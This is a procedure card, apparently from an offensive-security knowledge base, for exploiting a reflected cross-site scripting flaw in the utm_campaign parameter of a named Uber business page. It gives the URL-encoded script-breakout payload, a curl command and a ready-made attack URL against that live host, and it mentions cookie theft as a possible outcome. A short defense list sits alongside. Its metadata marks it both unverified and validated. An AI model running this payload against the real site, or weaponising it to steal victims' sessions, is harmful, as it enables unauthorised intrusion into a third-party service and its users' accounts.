---
id: proc-uber-inject-xss-001
tags:
  - xss
  - injection
  - javascript
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-xss-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:19.832Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS Payload into UTM Campaign Parameter

## Summary

This procedure crafts and injects a malicious JavaScript payload into the utm_campaign parameter of the Uber business endpoint URL, exploiting the lack of escaping to break out of a JavaScript string literal and execute arbitrary code in the browser context.

## Description

The vulnerability stems from the server reflecting the utm_campaign value directly into a <script> tag as part of a JavaScript object, e.g., `window.utm = {campaign: 'userinput'};`. By closing the string with a quote and injecting a new <script> tag, attackers can execute code like alert(0). The payload '</script><script>alert(0)</script>' is URL-encoded for transmission. This reflected XSS requires tricking a victim into visiting the link but can lead to severe impacts like cookie theft. The same applies to other utm_* parameters due to shared handling.

## Requirements

1. Web browser for manual testing or curl for automated requests
2. Knowledge of URL encoding (e.g., %27 for ')
3. Target URL: https://getrush.uber.com/business

## Defense

Defensive measures and detection strategies:

- Escape all user input in JavaScript contexts using functions like JSON.stringify or manual quote escaping
- Validate and sanitize UTM parameters server-side before rendering
- Deploy CSP headers to block unsafe-inline scripts

## Objectives

1. Break out of the JavaScript string in the reflected parameter
2. Inject and execute a new script tag
3. Confirm exploitation without server-side errors

## Instructions

### Step 1: Encode the Payload

**Context**: Prepare the XSS payload to evade URL parsing issues.

Manually encode or use a tool; payload: '</script><script>alert(0)</script>' becomes %27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E

> This closes the string literal and injects executable script.

### Step 2: Construct Malicious URL and Test

**Context**: Append the encoded payload to the utm_campaign parameter and load via browser or curl.

**Command** ([[commands/curl-xss-test]]):
```bash
curl -G "https://getrush.uber.com/business" --data-urlencode "utm_campaign='</script><script>alert(0)</script>" -d "utm_medium=top" -d "utm_source=website" --compressed
```

> This sends the request; in a browser, paste the full URL https://getrush.uber.com/business?utm_campaign=%27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&utm_medium=top&utm_source=website. Observe the response HTML for the injected script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-test]]

## Tools Used

- [[tools/Web-Browser]]

## Tags

- [[xss]]
- [[injection]]
